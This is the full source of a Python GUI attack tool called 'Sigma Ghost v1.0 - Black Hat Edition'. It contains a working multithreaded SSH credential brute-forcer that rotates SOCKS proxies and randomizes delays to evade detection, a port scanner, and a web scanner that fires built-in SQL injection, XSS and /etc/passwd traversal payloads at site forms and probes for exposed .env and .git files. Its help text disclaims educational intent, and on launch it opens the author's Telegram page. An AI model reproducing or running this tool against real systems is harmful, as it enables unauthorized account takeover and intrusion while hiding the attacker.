#!/usr/bin/env python3
import os
import sys
import time
import socket
import socks
import threading
import paramiko
import random
import re
import webbrowser
import requests
from queue import Queue
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urlparse, urljoin
from bs4 import BeautifulSoup
from colorama import Fore, Style, init
from tkinter import *
from tkinter import ttk, messagebox, filedialog, scrolledtext
import traceback
import itertools

# Initialize colorama
init(autoreset=True)

# ASCII Banner
BANNER = r"""
  _____ ____   ____  ___ ___   ____       ____  __ __   ___   _____ ______ 
 / ___/|    | /    ||   |   | /    |     /    ||  |  | /   \ / ___/|      |
(   \_  |  | |   __|| _   _ ||  o  |    |   __||  |  ||     (   \_ |      |
 \__  | |  | |  |  ||  \_/  ||     |    |  |  ||  _  ||  O  |\__  ||_|  |_|
 /  \ | |  | |  |_ ||   |   ||  _  |    |  |_ ||  |  ||     |/  \ |  |  |  
 \    | |  | |     ||   |   ||  |  |    |     ||  |  ||     |\    |  |  |  
  \___||____||___,_||___|___||__|__|    |___,_||__|__| \___/  \___|  |__|  
                                                                           
"""

TELEGRAM_URL = "https://web.telegram.org/k/#@Sigma_Ghost_hacking"
GITHUB_URL = "https://github.com/sigma-cyber-ghost"

class MatrixTerminal(scrolledtext.ScrolledText):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.configure(
            bg='black',
            fg='#00ff00',
            insertbackground='#00ff00',
            font=('Courier New', 12),
            relief=FLAT,
            state='disabled'
        )
        self.tag_config("green", foreground="#00ff00")
        self.tag_config("red", foreground="#ff0000")
        self.tag_config("yellow", foreground="#ffff00")
        self.tag_config("cyan", foreground="#00ffff")
        self.tag_config("blue", foreground="#0000ff")
        self.tag_config("purple", foreground="#ff00ff")

class SigmaGhostGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("Sigma Ghost v1.0 - Black Hat Edition")
        self.root.geometry("1200x800")
        self.style = ttk.Style()
        self.style.theme_use('clam')
        self.configure_styles()
        self.proxies = []
        self.attack_running = False
        self.scan_running = False
        self.web_scan_running = False
        self.success_count = 0
        self.attempt_count = 0
        self.config = {
            'ssh_timeout': 30,
            'max_threads': 100,
            'base_delay': 0.1,
            'retry_limit': 2,
            'max_attempts': 100000,
            'port_timeout': 1.5,
            'web_timeout': 10,
            'max_redirects': 5
        }
        self.payloads = {
            'sql': [],
            'xss': [],
            'traversal': [],
            'custom': []
        }

        self.create_widgets()
        self.setup_gui()
        self.show_banner()
        self.load_builtin_payloads()
        self.log("SSH Bruteforce Module Ready", "cyan")
        self.log("Port Scanner Module Ready", "cyan")
        self.log("Web Vulnerability Scanner Ready", "cyan")
        self.log("Warning: Unauthorized access is llegal!", "red")

        try:
            webbrowser.open(TELEGRAM_URL)
            webbrowser.open(GITHUB_URL)
        except Exception as e:
            self.log(f"Failed to open URLs: {str(e)}", "red")

    def configure_styles(self):
        self.style.configure('.', background='#0a0a0a', foreground='#00ff00')
        self.style.map('TNotebook.Tab', 
            background=[('selected', '#1a1a1a'), ('active', '#2a2a2a')],
            foreground=[('selected', '#00ff00'), ('active', '#00ff00')]
        )
        self.style.configure('TFrame', background='#0a0a0a')
        self.style.configure('TLabel', background='#0a0a0a', foreground='#00ff00')
        self.style.configure('TButton', 
            background='#1a1a1a', 
            foreground='#00ff00',
            bordercolor='#00ff00',
            lightcolor='#0a0a0a',
            darkcolor='#0a0a0a'
        )
        self.style.map('TButton',
            background=[('active', '#2a2a2a'), ('pressed', '#0a0a0a')],
            foreground=[('active', '#00ff00'), ('pressed', '#00ff00')]
        )

    def show_banner(self):
        self.console.config(state=NORMAL)
        self.console.insert(END, BANNER, "green")
        self.console.insert(END, "\nSigma Ghost v1.0 Initialized\n\n", "green")
        self.console.config(state=DISABLED)
        self.console.see(END)

    def create_widgets(self):
        main_frame = ttk.Frame(self.root)
        main_frame.pack(expand=1, fill="both", padx=5, pady=5)

        self.notebook = ttk.Notebook(main_frame)
        
        self.ssh_frame = ttk.Frame(self.notebook)
        self.create_ssh_tab()
        
        self.port_frame = ttk.Frame(self.notebook)
        self.create_port_tab()
        
        self.web_frame = ttk.Frame(self.notebook)
        self.create_web_tab()
        
        self.notebook.add(self.ssh_frame, text="[ SSH Bruteforce ]")
        self.notebook.add(self.port_frame, text="[ Port Scanner ]")
        self.notebook.add(self.web_frame, text="[ Web Vuln Scan ]")
        self.notebook.pack(expand=1, fill="both")

        self.console = MatrixTerminal(main_frame, wrap=WORD)
        self.console.pack(expand=1, fill="both", padx=5, pady=5)

        self.status_bar = ttk.Label(main_frame, text="Ready", relief=SUNKEN)
        self.status_bar.pack(fill=X, padx=5, pady=5)

    def setup_gui(self):
        self.root.protocol("WM_DELETE_WINDOW", self.on_close)
        self.root.bind('<Control-q>', lambda e: self.on_close())
        self.root.bind('<F1>', lambda e: self.show_help())

    def create_ssh_tab(self):
        entry_style = {
            'background': '#1a1a1a',
            'foreground': '#00ff00',
            'insertbackground': '#00ff00',
            'relief': 'flat',
            'borderwidth': 1,
            'highlightthickness': 1,
            'highlightbackground': '#00ff00',
            'highlightcolor': '#00ff00',
            'font': ('Courier New', 10)
        }

        # SSH Tab Components
        ttk.Label(self.ssh_frame, text="Target IP/Hostname:").grid(row=0, column=0, sticky=W, padx=5, pady=2)
        self.target_ip = Entry(self.ssh_frame, **entry_style, width=30)
        self.target_ip.grid(row=0, column=1, padx=5, pady=2, sticky=W)

        ttk.Label(self.ssh_frame, text="Port:").grid(row=1, column=0, sticky=W, padx=5, pady=2)
        self.ssh_port = Entry(self.ssh_frame, **entry_style, width=10)
        self.ssh_port.insert(0, "22")
        self.ssh_port.grid(row=1, column=1, padx=5, pady=2, sticky=W)

        ttk.Label(self.ssh_frame, text="Username Wordlist:").grid(row=2, column=0, sticky=W, padx=5, pady=2)
        self.user_file = Entry(self.ssh_frame, **entry_style, width=30)
        self.user_file.grid(row=2, column=1, padx=5, pady=2, sticky=W)
        ttk.Button(self.ssh_frame, text="Browse", command=lambda: self.browse_file(self.user_file)).grid(row=2, column=2, padx=5)

        ttk.Label(self.ssh_frame, text="Password Wordlist:").grid(row=3, column=0, sticky=W, padx=5, pady=2)
        self.pass_file = Entry(self.ssh_frame, **entry_style, width=30)
        self.pass_file.grid(row=3, column=1, padx=5, pady=2, sticky=W)
        ttk.Button(self.ssh_frame, text="Browse", command=lambda: self.browse_file(self.pass_file)).grid(row=3, column=2, padx=5)

        ttk.Label(self.ssh_frame, text="Proxy List (optional):").grid(row=4, column=0, sticky=W, padx=5, pady=2)
        self.proxy_file = Entry(self.ssh_frame, **entry_style, width=30)
        self.proxy_file.grid(row=4, column=1, padx=5, pady=2, sticky=W)
        ttk.Button(self.ssh_frame, text="Browse", command=lambda: self.browse_file(self.proxy_file)).grid(row=4, column=2, padx=5)

        ttk.Label(self.ssh_frame, text="Max Threads:").grid(row=5, column=0, sticky=W, padx=5, pady=2)
        self.max_threads = Entry(self.ssh_frame, **entry_style, width=10)
        self.max_threads.insert(0, "100")
        self.max_threads.grid(row=5, column=1, padx=5, pady=2, sticky=W)

        ttk.Label(self.ssh_frame, text="Timeout (sec):").grid(row=6, column=0, sticky=W, padx=5, pady=2)
        self.timeout = Entry(self.ssh_frame, **entry_style, width=10)
        self.timeout.insert(0, "30")
        self.timeout.grid(row=6, column=1, padx=5, pady=2, sticky=W)

        self.start_button = ttk.Button(self.ssh_frame, text="Start Attack", command=self.start_ssh_attack)
        self.start_button.grid(row=7, column=1, pady=10, sticky=W)

        self.stop_button = ttk.Button(self.ssh_frame, text="Stop Attack", command=self.stop_attack, state=DISABLED)
        self.stop_button.grid(row=7, column=2, pady=10, sticky=W)

        self.stats_label = ttk.Label(self.ssh_frame, text="Attempts: 0 | Success: 0")
        self.stats_label.grid(row=8, column=0, columnspan=3, pady=5)

    def create_port_tab(self):
        entry_style = {
            'background': '#1a1a1a',
            'foreground': '#00ff00',
            'insertbackground': '#00ff00',
            'relief': 'flat',
            'borderwidth': 1,
            'highlightthickness': 1,
            'highlightbackground': '#00ff00',
            'highlightcolor': '#00ff00',
            'font': ('Courier New', 10)
        }

        ttk.Label(self.port_frame, text="Target IP/Hostname:").grid(row=0, column=0, sticky=W, padx=5, pady=2)
        self.port_target = Entry(self.port_frame, **entry_style, width=30)
        self.port_target.grid(row=0, column=1, padx=5, pady=2, sticky=W)

        ttk.Label(self.port_frame, text="Start Port:").grid(row=1, column=0, sticky=W, padx=5, pady=2)
        self.start_port = Entry(self.port_frame, **entry_style, width=10)
        self.start_port.insert(0, "1")
        self.start_port.grid(row=1, column=1, padx=5, pady=2, sticky=W)

        ttk.Label(self.port_frame, text="End Port:").grid(row=2, column=0, sticky=W, padx=5, pady=2)
        self.end_port = Entry(self.port_frame, **entry_style, width=10)
        self.end_port.insert(0, "1024")
        self.end_port.grid(row=2, column=1, padx=5, pady=2, sticky=W)

        ttk.Label(self.port_frame, text="Max Threads:").grid(row=3, column=0, sticky=W, padx=5, pady=2)
        self.port_threads = Entry(self.port_frame, **entry_style, width=10)
        self.port_threads.insert(0, "200")
        self.port_threads.grid(row=3, column=1, padx=5, pady=2, sticky=W)

        self.port_start = ttk.Button(self.port_frame, text="Start Scan", command=self.start_port_scan)
        self.port_start.grid(row=4, column=1, pady=10, sticky=W)

        self.port_stop = ttk.Button(self.port_frame, text="Stop Scan", command=self.stop_port_scan, state=DISABLED)
        self.port_stop.grid(row=4, column=2, pady=10, sticky=W)

    def create_web_tab(self):
        entry_style = {
            'background': '#1a1a1a',
            'foreground': '#00ff00',
            'insertbackground': '#00ff00',
            'relief': 'flat',
            'borderwidth': 1,
            'highlightthickness': 1,
            'highlightbackground': '#00ff00',
            'highlightcolor': '#00ff00',
            'font': ('Courier New', 10)
        }

        payload_frame = ttk.LabelFrame(self.web_frame, text="Payload Management")
        payload_frame.grid(row=0, column=0, columnspan=3, padx=5, pady=5, sticky="ew")

        self.payload_source = StringVar(value="builtin")
        ttk.Radiobutton(payload_frame, text="Built-in Payloads", variable=self.payload_source, value="builtin").grid(row=0, column=0, padx=5, sticky=W)
        ttk.Radiobutton(payload_frame, text="Custom Payloads", variable=self.payload_source, value="custom").grid(row=0, column=1, padx=5, sticky=W)

        self.custom_payload_file = Entry(payload_frame, **entry_style, width=30, state=DISABLED)
        self.custom_payload_file.grid(row=1, column=0, padx=5, pady=2, sticky=W)
        self.browse_payload_btn = ttk.Button(payload_frame, text="Browse", command=self.load_custom_payloads, state=DISABLED)
        self.browse_payload_btn.grid(row=1, column=1, padx=5)

        self.selected_payloads = {
            'sql': BooleanVar(value=True),
            'xss': BooleanVar(value=True),
            'traversal': BooleanVar(value=True),
            'custom': BooleanVar(value=False)
        }
        
        self.info_disclosure = BooleanVar(value=True)
        
        ttk.Checkbutton(payload_frame, text="SQLi", variable=self.selected_payloads['sql']).grid(row=2, column=0, sticky=W, padx=5)
        ttk.Checkbutton(payload_frame, text="XSS", variable=self.selected_payloads['xss']).grid(row=2, column=1, sticky=W, padx=5)
        ttk.Checkbutton(payload_frame, text="Traversal", variable=self.selected_payloads['traversal']).grid(row=3, column=0, sticky=W, padx=5)
        ttk.Checkbutton(payload_frame, text="Custom", variable=self.selected_payloads['custom']).grid(row=3, column=1, sticky=W, padx=5)
        ttk.Checkbutton(payload_frame, text="Info Disclosure", variable=self.info_disclosure).grid(row=4, column=0, sticky=W, padx=5)

        self.payload_source.trace_add('write', self.handle_payload_source_change)

        ttk.Label(self.web_frame, text="Target URL:").grid(row=5, column=0, sticky=W, padx=5, pady=2)
        self.web_target = Entry(self.web_frame, **entry_style, width=40)
        self.web_target.grid(row=5, column=1, columnspan=2, padx=5, pady=2, sticky=W)

        self.web_start = ttk.Button(self.web_frame, text="Start Scan", command=self.start_web_scan)
        self.web_start.grid(row=6, column=1, pady=10, sticky=W)

        self.web_stop = ttk.Button(self.web_frame, text="Stop Scan", command=self.stop_web_scan, state=DISABLED)
        self.web_stop.grid(row=6, column=2, pady=10, sticky=W)

    def handle_payload_source_change(self, *args):
        if self.payload_source.get() == "custom":
            self.custom_payload_file.config(state=NORMAL)
            self.browse_payload_btn.config(state=NORMAL)
            self.selected_payloads['custom'].set(True)
        else:
            self.custom_payload_file.config(state=DISABLED)
            self.browse_payload_btn.config(state=DISABLED)
            self.selected_payloads['custom'].set(False)

    def load_builtin_payloads(self):
        self.payloads['sql'] = [
            "'", "';", "' OR 1=1--", "\" OR \"\"=\"", 
            "UNION SELECT NULL--", "OR 1=1", "AND 1=1"
        ]
        self.payloads['xss'] = [
            "<script>alert(1)</script>", 
            "<img src=x onerror=alert(1)>",
            "javascript:alert(1)"
        ]
        self.payloads['traversal'] = [
            "../../../../etc/passwd",
            "..%2F..%2F..%2Fetc%2Fpasswd",
            "%2e%2e/%2e%2e/%2e%2e/etc/passwd"
        ]
        self.log("Loaded built-in payloads", "cyan")

    def load_custom_payloads(self):
        file_path = filedialog.askopenfilename(filetypes=[("Text files", "*.txt")])
        if file_path:
            self.custom_payload_file.delete(0, END)
            self.custom_payload_file.insert(0, file_path)
            try:
                with open(file_path, 'r') as f:
                    self.payloads['custom'] = [line.strip() for line in f if line.strip()]
                self.log(f"Loaded {len(self.payloads['custom'])} custom payloads", "cyan")
            except Exception as e:
                self.log(f"Error loading payloads: {str(e)}", "red")

    def log(self, message, color="green"):
        self.console.config(state=NORMAL)
        self.console.insert(END, f"[{time.strftime('%H:%M:%S')}] {message}\n", color)
        self.console.config(state=DISABLED)
        self.console.see(END)
        self.update_status(f"Last: {message}")

    def update_status(self, message):
        self.status_bar.config(text=f"Status: {message} | Attempts: {self.attempt_count} | Success: {self.success_count}")

    def update_stats(self):
        self.stats_label.config(text=f"Attempts: {self.attempt_count} | Success: {self.success_count}")

    def browse_file(self, entry_widget):
        filename = filedialog.askopenfilename()
        if filename:
            entry_widget.delete(0, END)
            entry_widget.insert(0, filename)

    def start_ssh_attack(self):
        if self.attack_running:
            return
            
        self.attack_running = True
        self.success_count = 0
        self.attempt_count = 0
        self.update_stats()
        
        target = self.target_ip.get().strip()
        port = self.ssh_port.get().strip()
        userfile = self.user_file.get().strip()
        passfile = self.pass_file.get().strip()
        proxy_file = self.proxy_file.get().strip()

        if not target:
            self.log("Error: Target IP is required", "red")
            self.attack_running = False
            return
            
        if not userfile or not passfile:
            self.log("Error: Both username and password wordlists are required", "red")
            self.attack_running = False
            return

        try:
            port = int(port)
            if not (0 < port <= 65535):
                raise ValueError
        except ValueError:
            self.log("Error: Invalid port number (1-65535)", "red")
            self.attack_running = False
            return

        try:
            max_threads = int(self.max_threads.get())
            if max_threads < 1 or max_threads > 500:
                raise ValueError
            self.config['max_threads'] = max_threads
        except ValueError:
            self.log("Error: Max threads must be between 1-500", "red")
            self.attack_running = False
            return

        try:
            timeout = int(self.timeout.get())
            if timeout < 1 or timeout > 120:
                raise ValueError
            self.config['ssh_timeout'] = timeout
        except ValueError:
            self.log("Error: Timeout must be between 1-120 seconds", "red")
            self.attack_running = False
            return

        if proxy_file:
            try:
                with open(proxy_file, 'rb') as f:
                    self.proxies = [line.decode('utf-8', errors='ignore').strip() 
                                  for line in f if line.strip()]
                self.log(f"[*] Loaded {len(self.proxies)} proxies", "cyan")
            except Exception as e:
                self.log(f"[!] Proxy error: {str(e)}", "red")
                self.proxies = []

        attack_thread = threading.Thread(
            target=self.run_ssh_attack,
            args=(target, port, userfile, passfile),
            daemon=True
        )
        attack_thread.start()

    def run_ssh_attack(self, target, port, userfile, passfile):
        try:
            with open(userfile, 'rb') as uf:
                users = [line.decode('utf-8', errors='ignore').strip() 
                        for line in uf if line.strip()]
                
            with open(passfile, 'rb') as pf:
                passwords = [line.decode('utf-8', errors='ignore').strip() 
                           for line in pf if line.strip()]

            if not users or not passwords:
                raise ValueError("Wordlist is empty")

            self.log(f"[*] Loaded {len(users)} users and {len(passwords)} passwords", "cyan")
            self.log(f"[*] Starting attack on {target}:{port}", "yellow")
            self.log(f"[*] Using {self.config['max_threads']} threads", "blue")
            
            self.ssh_queue = Queue()
            for combo in itertools.product(users, passwords):
                self.ssh_queue.put(combo)
                
            self.start_button.config(state=DISABLED)
            self.stop_button.config(state=NORMAL)
            
            self.thread_pool = ThreadPoolExecutor(
                max_workers=self.config['max_threads'],
                thread_name_prefix='ssh_worker'
            )
            
            for _ in range(self.config['max_threads']):
                self.thread_pool.submit(self.ssh_worker, target, port)

        except Exception as e:
            self.log(f"[!] Attack initialization failed: {str(e)}", "red")
            self.log(traceback.format_exc(), "red")
            self.stop_attack()

    def ssh_worker(self, target, port):
        while self.attack_running and not self.ssh_queue.empty() and self.attempt_count < self.config['max_attempts']:
            try:
                user, pwd = self.ssh_queue.get_nowait()
                self.attempt_count += 1
                if self.attempt_count % 100 == 0:
                    self.update_stats()
                
                if self.try_ssh_connection(target, port, user, pwd):
                    self.success_count += 1
                    self.update_stats()
                    self.stop_attack()
                    return
            except Exception as e:
                time.sleep(0.1)
        
        if self.ssh_queue.empty():
            self.log("[*] Attack completed - all combinations tried", "yellow")
            self.stop_attack()

    def try_ssh_connection(self, target, port, user, pwd):
        ssh = None
        transport = None
        proxy_sock = None
        
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            if self.proxies and random.random() > 0.3:
                try:
                    proxy = random.choice(self.proxies)
                    if ':' in proxy:
                        proxy_host, proxy_port = proxy.split(':')[:2]
                        proxy_port = int(proxy_port)
                        
                        proxy_sock = socks.socksocket()
                        proxy_sock.set_proxy(socks.SOCKS5, proxy_host, proxy_port)
                        proxy_sock.settimeout(self.config['ssh_timeout'])
                        proxy_sock.connect((target, port))
                        
                        transport = paramiko.Transport(proxy_sock)
                except Exception as proxy_error:
                    if proxy_sock:
                        proxy_sock.close()
                    proxy_sock = None
            
            if not proxy_sock:
                transport = paramiko.Transport((target, port))
            
            transport.start_client(timeout=self.config['ssh_timeout'])
            
            try:
                transport.auth_password(username=user, password=pwd)
                if transport.is_authenticated():
                    self.log(f"[+] SUCCESS! Credentials found: {user}:{pwd}", "green")
                    return True
            except paramiko.AuthenticationException:
                pass
            except paramiko.SSHException as e:
                self.log(f"[!] SSH Error: {str(e)}", "red")
            except Exception as e:
                self.log(f"[!] Connection Error: {str(e)}", "red")
            
            time.sleep(self.config['base_delay'] * random.uniform(0.5, 1.5))
            
        except Exception as e:
            self.log(f"[!] General Error: {str(e)}", "red")
        finally:
            try:
                if transport:
                    transport.close()
                if ssh:
                    ssh.close()
                if proxy_sock:
                    proxy_sock.close()
            except:
                pass
            
        return False

    def stop_attack(self):
        self.attack_running = False
        if hasattr(self, 'thread_pool'):
            self.thread_pool.shutdown(wait=False)
        self.log("[*] Attack stopped", "yellow")
        self.start_button.config(state=NORMAL)
        self.stop_button.config(state=DISABLED)
        self.update_stats()

    def start_port_scan(self):
        if self.scan_running:
            return

        target = self.port_target.get().strip()
        start_port = self.start_port.get().strip()
        end_port = self.end_port.get().strip()
        max_threads = self.port_threads.get().strip()

        try:
            start_port = int(start_port)
            end_port = int(end_port)
            max_threads = int(max_threads)
            if not (1 <= start_port <= end_port <= 65535):
                raise ValueError
            if max_threads < 1 or max_threads > 500:
                raise ValueError
        except ValueError:
            self.log("Invalid port range or thread count", "red")
            return

        self.scan_running = True
        self.port_start.config(state=DISABLED)
        self.port_stop.config(state=NORMAL)
        self.log(f"Starting port scan on {target} ({start_port}-{end_port})", "cyan")

        scan_thread = threading.Thread(
            target=self.run_port_scan,
            args=(target, start_port, end_port, max_threads),
            daemon=True
        )
        scan_thread.start()

    def run_port_scan(self, target, start_port, end_port, max_threads):
        try:
            ports = Queue()
            for port in range(start_port, end_port + 1):
                ports.put(port)

            with ThreadPoolExecutor(max_workers=max_threads) as executor:
                futures = []
                while not ports.empty() and self.scan_running:
                    port = ports.get()
                    futures.append(executor.submit(self.check_port, target, port))

                for future in futures:
                    if not self.scan_running:
                        break
                    future.result()

        except Exception as e:
            self.log(f"Port scan error: {str(e)}", "red")
        finally:
            self.stop_port_scan()

    def check_port(self, target, port):
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(self.config['port_timeout'])
                result = s.connect_ex((target, port))
                if result == 0:
                    self.log(f"Port {port} is open", "green")
        except Exception as e:
            pass

    def stop_port_scan(self):
        self.scan_running = False
        self.port_start.config(state=NORMAL)
        self.port_stop.config(state=DISABLED)
        self.log("Port scan stopped", "yellow")

    def start_web_scan(self):
        if self.web_scan_running:
            return

        target = self.web_target.get().strip()
        payload_file = self.custom_payload_file.get().strip()

        if not target:
            self.log("Error: Target URL is required", "red")
            return

        if self.payload_source.get() == "custom":
            if not payload_file:
                self.log("Custom payloads selected but no file loaded!", "red")
                return
        else:
            self.load_builtin_payloads()

        active_payloads = []
        for ptype in ['sql', 'xss', 'traversal', 'custom']:
            if self.selected_payloads[ptype].get():
                active_payloads.extend(self.payloads[ptype])

        if not active_payloads:
            self.log("No payloads selected for scanning!", "red")
            return

        self.web_scan_running = True
        self.web_start.config(state=DISABLED)
        self.web_stop.config(state=NORMAL)

        scan_thread = threading.Thread(
            target=self.run_web_scan,
            args=(target, active_payloads),
            daemon=True
        )
        scan_thread.start()

    def run_web_scan(self, target, payloads):
        try:
            self.log(f"[*] Starting web vulnerability scan on {target}", "cyan")
            session = requests.Session()
            session.max_redirects = self.config['max_redirects']
            session.verify = False

            links = self.crawl_website(target, session)
            self.log(f"[*] Found {len(links)} unique links to scan", "cyan")

            if self.info_disclosure.get():
                self.check_info_disclosure(target, session)

            for url in links:
                if not self.web_scan_running:
                    break
                
                if self.selected_payloads['sql'].get() or self.selected_payloads['xss'].get():
                    self.test_forms(url, session, payloads)
                
                if self.selected_payloads['traversal'].get():
                    self.test_directory_traversal(url, session, payloads)

        except Exception as e:
            self.log(f"Web scan error: {str(e)}", "red")
        finally:
            self.stop_web_scan()

    def crawl_website(self, target, session):
        visited = set()
        queue = [target]
        parsed_target = urlparse(target)
        
        while queue and self.web_scan_running:
            url = queue.pop(0)
            if url in visited:
                continue
                
            visited.add(url)
            self.log(f"[*] Crawling: {url}", "blue")

            try:
                response = session.get(url, timeout=self.config['web_timeout'])
                soup = BeautifulSoup(response.content, 'html.parser')

                for link in soup.find_all('a', href=True):
                    absolute_url = urljoin(url, link['href'])
                    if parsed_target.netloc in absolute_url and absolute_url not in visited:
                        queue.append(absolute_url)

            except Exception as e:
                continue

        return visited

    def test_forms(self, url, session, payloads):
        try:
            response = session.get(url, timeout=self.config['web_timeout'])
            soup = BeautifulSoup(response.content, 'html.parser')

            for form in soup.find_all('form'):
                form_details = self.get_form_details(form)
                for payload in payloads:
                    if not self.web_scan_running:
                        return
                        
                    data = {}
                    for input_tag in form_details["inputs"]:
                        if input_tag["type"] == "hidden":
                            data[input_tag["name"]] = input_tag["value"]
                        else:
                            data[input_tag["name"]] = payload

                    if form_details["method"] == "post":
                        response = session.post(form_details["action"], data=data)
                    else:
                        response = session.get(form_details["action"], params=data)

                    if self.selected_payloads['sql'].get():
                        if any(error in response.text.lower() for error in ["syntax error", "mysql", "sql"]):
                            self.log(f"[!] Possible SQLi in {form_details['action']} with payload: {payload}", "red")

                    if self.selected_payloads['xss'].get():
                        if payload in response.text:
                            self.log(f"[!] Possible XSS in {form_details['action']} with payload: {payload}", "red")

        except Exception as e:
            pass

    def test_directory_traversal(self, url, session, payloads):
        for payload in payloads:
            if not self.web_scan_running:
                return
                
            test_url = urljoin(url, payload)
            try:
                response = session.get(test_url, timeout=self.config['web_timeout'])
                if response.status_code == 200 and "root:" in response.text:
                    self.log(f"[!] Possible directory traversal: {test_url}", "red")
            except:
                pass

    def check_info_disclosure(self, target, session):
        checks = {
            "/.git/HEAD": "Git repository exposed",
            "/.env": "Environment file exposed",
            "/phpinfo.php": "PHPInfo exposed",
            "/server-status": "Server status exposed"
        }

        for path, message in checks.items():
            if not self.web_scan_running:
                return
                
            try:
                response = session.get(urljoin(target, path), timeout=self.config['web_timeout'])
                if response.status_code == 200:
                    self.log(f"[!] {message} at {path}", "red")
            except:
                pass

    def get_form_details(self, form):
        details = {}
        action = form.attrs.get("action", "").lower()
        method = form.attrs.get("method", "get").lower()
        inputs = []
        
        for input_tag in form.find_all("input"):
            input_type = input_tag.attrs.get("type", "text")
            input_name = input_tag.attrs.get("name", "")
            input_value = input_tag.attrs.get("value", "")
            inputs.append({
                "type": input_type, 
                "name": input_name,
                "value": input_value
            })
            
        details["action"] = action
        details["method"] = method
        details["inputs"] = inputs
        return details

    def stop_web_scan(self):
        self.web_scan_running = False
        self.web_start.config(state=NORMAL)
        self.web_stop.config(state=DISABLED)
        self.log("Web scan stopped", "yellow")

    def show_help(self):
        help_text = """
        Sigma Ghost v1.0
        
        Features:
        - SSH Bruteforce with proxy support
        - Port Scanner with configurable range
        - Web Vulnerability Scanner with:
          * SQL Injection testing
          * XSS detection
          * Directory Traversal checks
          * Information Disclosure checks
          * Custom payload support
        
        Hotkeys:
        Ctrl+Q - Exit program
        F1 - Show this help
        
        Note: This tool is not for educational purposes only.
        Unauthorized access to computer systems is llegal.
        
        GitHub: https://github.com/sigma-cyber-ghost
        """
        messagebox.showinfo("Sigma Ghost Help", help_text)

    def on_close(self):
        if messagebox.askokcancel("Quit", "Do you want to exit Sigma Ghost?"):
            self.stop_attack()
            self.stop_port_scan()
            self.stop_web_scan()
            self.root.destroy()

if __name__ == "__main__":
    root = Tk()
    root.configure(background='black')
    try:
        app = SigmaGhostGUI(root)
        root.mainloop()
    except Exception as e:
        print(f"Fatal error: {str(e)}")
        traceback.print_exc()
